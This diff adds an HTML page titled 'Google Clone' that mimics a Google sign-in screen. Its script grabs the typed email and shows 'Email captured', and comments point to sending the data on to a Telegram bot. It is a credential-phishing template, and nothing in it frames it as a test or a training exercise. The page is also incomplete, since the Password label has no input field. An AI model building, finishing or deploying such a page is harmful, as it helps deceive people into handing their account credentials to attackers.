@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Clone</title>
+<style>
+body {
+margin: 0;
+padding: 0;
+font-family: Arial, sans-serif;
+background-color: #f1f3f4;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+height: 100vh;
+}
+
+.logo {
+font-size: 24px;
+color: #5f6368;
+margin-bottom: 20px;
+cursor: pointer;
+}
+
+.login-box {
+background-color: white;
+padding: 40px;
+border-radius: 8px;
+box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+width: 350px;
+display: flex;
+flex-direction: column;
+gap: 20px;
+}
+
+.input-group {
+display: flex;
+flex-direction: column;
+gap: 5px;
+}
+
+.input-group label {
+font-size: 12px;
+color: #5f6368;
+}
+
+.input-group input {
+padding: 13px 15px;
+border: 1px solid #dfe1e5;
+border-radius: 4px;
+outline: none;
+font-size: 16px;
+}
+
+.input-group input:focus {
+box-shadow: 0 1px 6px rgba(32,33,36,0.28);
+border-color: #4285f4;
+}
+
+.btn-primary {
+background-color: #1a73e8;
+color: white;
+padding: 10px 20px;
+border: none;
+border-radius: 4px;
+cursor: pointer;
+font-size: 14px;
+font-weight: 500;
+}
+
+.btn-primary:hover {
+background-color: #1557b0;
+}
+
+.divider {
+text-align: center;
+margin: 10px 0;
+color: #9aa0a6;
+font-size: 12px;
+}
+
+.footer-links {
+display: flex;
+justify-content: space-between;
+font-size: 12px;
+color: #5f6368;
+}
+
+.footer-links a {
+color: #1a73e8;
+text-decoration: none;
+}
+
+.footer-links a:hover {
+text-decoration: underline;
+}
+</style>
+</head>
+<body>
+<div class="logo">Google</div>
+<div class="login-box">
+<div class="input-group">
+<label for="email">Email or phone</label>
+<input type="text" id="email" placeholder="name@gmail.com">
+</div>
+<div class="input-group">
+<label for="password">Password</label>
+</div>
+<button class="btn-primary" onclick="handleLogin()">Next</button>
+<div class="divider">or</div>
+<button class="btn-primary" onclick="window.location.href='https://www.google.com'">Continue with Google</button>
+<div class="footer-links">
+<a href="#">Help</a>
+<a href="#">Forgot password?</a>
+</div>
+</div>
+<script>
+function handleLogin() {
+const email = document.getElementById('email').value;
+if(email) {
+// This is where you would typically send data to your backend
+// For the Telegram bot integration, you would use your bot API
+alert(`Email captured: ${email}`);
+}
+}
+</script>
+</body>
+</html>
